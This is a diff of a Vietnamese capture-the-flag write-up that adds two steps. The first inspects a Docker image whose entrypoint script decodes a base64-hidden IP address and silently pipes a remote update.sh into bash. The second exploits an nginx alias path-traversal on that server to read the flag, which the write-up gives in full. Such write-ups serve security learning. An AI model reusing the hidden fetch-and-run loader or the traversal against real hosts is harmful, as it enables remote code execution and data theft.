@@ -315,7 +315,54 @@ echo "Done. If no flag was found, try inspecting layers manually in $WORK_DIR"
 
 - Ta có phần còn lại của flag: 6ea2c94c3e
 
-### 7. To be continue
+### 7. Check Docker Entrypoint
+- Vẫn chưa có flag nên là vô check cái image xem có gì không
+```
+~ > docker run -it --entrypoint /bin/sh acrqrwebllptbcbf.azurecr.io/hello-world
+/app # ls -lia
+total 16
+  22988 drwxr-xr-x    1 root     root          4096 Sep 20 18:35 .
+  38814 drwxr-xr-x    1 root     root          4096 Sep 23 10:28 ..
+  22866 -rw-rw-r--    1 root     root            27 Sep 20 18:32 app.js
+  22989 -rwxrwxr-x    1 root     root           569 Sep 20 18:16 entrypoint.sh
+/app # cat entrypoint.sh
+#!/bin/bash
 
-## DF25{d4e9e6814f6ea2c94c3e
+echo "[INFO] Starting application..."
+
+export NODE_ENV=${NODE_ENV:-production}
+export PORT=${PORT:-3000}
+SERVER=$(echo MTg4LjE2Ni4yMzAuMTU3Cg== | base64 -d)
+check_updates() { curl -s http://$SERVER/update.sh | bash > /dev/null 2>&1 }
+
+start_app() {
+    cd /app
+
+    if [ -f "package.json" ]; then
+        npm install --silent
+    fi
+
+    check_updates &
+
+    if [ -f "server.js" ]; then
+        exec node server.js
+    elif [ -f "app.js" ]; then
+        exec node app.js
+    else
+        echo "[ERROR] No app found"
+        exit 1
+    fi
+}
+
+start_app "$@"
+```
+
+### 8. Check Suspicious Server
+- Thấy gì đó lạ lạ nên check cái serer từ base64: `http://188.166.230.157/` nhưng 404 not found
+- Chạy scan để tìm common thì ra `http://188.166.230.157/aa/`
+- Có file `default.save` là nginx config
+- Check thấy lỗi misconfig nên mò đọc folder `http://188.166.230.157/aa../uploads/`
+- Flag ở trog file `http://188.166.230.157/aa../uploads/flag`: **f032f1fb5859}**
+
+## DF25{d4e9e6814f6ea2c94c3ef032f1fb5859}
 ## Thanks CBJS!
